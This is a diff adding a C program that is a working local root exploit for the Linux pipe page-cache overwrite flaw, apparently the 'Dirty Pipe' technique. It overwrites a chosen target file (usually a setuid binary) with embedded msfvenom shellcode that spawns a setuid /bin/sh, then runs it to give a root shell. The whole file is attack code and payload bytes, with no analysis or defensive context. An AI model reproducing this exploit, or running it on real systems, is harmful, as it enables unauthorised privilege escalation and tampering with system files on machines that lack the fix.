@@ -1,0 +1,88 @@
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/user.h>
+
+//msfvenom -p linux/x64/exec CMD=/bin/sh -f elf PrependSetuid=True | xxd -i
+unsigned char shellcode[] = {  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xac, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x48, 0xb8, 0x2f, 0x62,
+        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52, 0x66,
+        0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x08, 0x00, 0x00, 0x00, 0x2f,
+        0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a,
+        0x3b, 0x58, 0x0f, 0x05
+};
+unsigned int shellcode_len = 172;
+
+void errExit(char * msg)
+{
+        printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
+        exit(EXIT_FAILURE);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+        long            page_size;
+        size_t          offset_in_file;
+        size_t          data_size;
+        int             target_file_fd;
+        int             pipe_fd[2];
+        int             pipe_size;
+        char            *buffer;
+        int             retval;
+
+        if (argc < 2)
+        {
+                puts("[*] Usage: ./exp target_file");
+                exit(EXIT_FAILURE);
+        }
+        page_size = sysconf(_SC_PAGE_SIZE);
+        offset_in_file = 1;
+
+        target_file_fd = open(argv[1], O_RDONLY);
+        if (target_file_fd < 0)
+                errExit("Failed to open the target file!");
+
+        pipe(pipe_fd);
+        pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
+        buffer = (char*) malloc(page_size);
+
+        for (int size_left = pipe_size; size_left > 0; )
+        {
+                int per_write = size_left > page_size ? page_size : size_left;
+                size_left -= write(pipe_fd[1], buffer, per_write);
+        }
+
+        for (int size_left = pipe_size; size_left > 0; )
+        {
+                int per_read = size_left > page_size ? page_size : size_left;
+                size_left -= read(pipe_fd[0], buffer, per_read);
+        }
+
+        offset_in_file--;   
+        retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
+        if (retval < 0)
+                errExit("splice failed!");
+        else if (retval == 0)
+                errExit("short splice!");
+
+        retval = write(pipe_fd[1], &shellcode[1], shellcode_len);
+        if (retval < 0)
+                errExit("Write failed!");
+        else if (retval < shellcode_len)
+                errExit("Short write!");
+
+        puts("Here comes the root shell ~");
+        system(argv[1]);
+}
